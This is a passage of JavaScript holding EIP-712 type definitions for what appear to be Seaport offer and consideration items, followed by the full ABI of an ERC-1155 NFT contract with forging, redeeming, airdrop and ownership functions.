    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
  ],
  ConsiderationItem: [
    { name: "itemType", type: "uint8" },
    { name: "token", type: "address" },
    { name: "identifierOrCriteria", type: "uint256" },
    { name: "startAmount", type: "uint256" },
    { name: "endAmount", type: "uint256" },
    { name: "recipient", type: "address" },
  ],
};

const ERC1155ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256[]","name":"ids","type":"uint256[]"},{"indexed":false,"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"TransferBatch","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"id","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"TransferSingle","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"string","name":"value","type":"string"},{"indexed":true,"internalType":"uint256","name":"id","type":"uint256"}],"name":"URI","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"indexed":false,"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"indexed":false,"internalType":"address","name":"owner","type":"address"}],"name":"newForge","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"address","name":"initialCollection","type":"address"},{"indexed":false,"internalType":"uint256[]","name":"cloneXIds","type":"uint256[]"},{"indexed":false,"internalType":"uint256[]","name":"wearablesIds","type":"uint256[]"},{"indexed":false,"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"name":"newRedeemBatch","type":"event"},{"inputs":[{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"amount","type":"uint256[]"},{"internalType":"address[]","name":"owners","type":"address[]"}],"name":"airdropTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"id","type":"uint256"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"accounts","type":"address[]"},{"internalType":"uint256[]","name":"ids","type":"uint256[]"}],"name":"balanceOfBatch","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"id","type":"uint256"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256[]","name":"ids","type":"uint256[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"burnBatch","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"cantForge","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256[]","name":"tokenIds","type":"uint256[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"name":"forgeToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"generalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"initialCollection","type":"address"},{"internalType":"uint256[]","name":"cloneXIds","type":"uint256[]"},{"internalType":"uint256[]","name":"wearableIds","type":"uint256[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"name":"redeemBatch","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"remainingMints","outputs":[{"components":[{"internalType":"uint256","name":"WearableId","type":"uint256"},{"internalType":"uint256","name":"RemainingMints","type":"uint256"}],"internalType":"struct RedeemableToken.Remaining[]","name":"","type":"tuple[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256[]","name":"ids","type":"uint256[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeBatchTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"id","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newAddress","type":"address"}],"name":"setCloneX","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newAddress","type":"address"}],"name":"setCloneXMetadata","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newAddress","type":"address"}],"name":"setForgingAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newContractAddress","type":"address"}],"name":"setMiddleware","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"string","name":"newUri","type":"string"}],"name":"setTokenURIs","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes1","name":"dna","type":"bytes1"},{"internalType":"uint256[2]","name":"range","type":"uint256[2]"}],"name":"setWearableRange","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"toggleForgeable","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"tokenURIs","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"uri","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"wearableSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdrawFunds","outputs":[],"stateMutability":"nonpayable","type":"function"}]
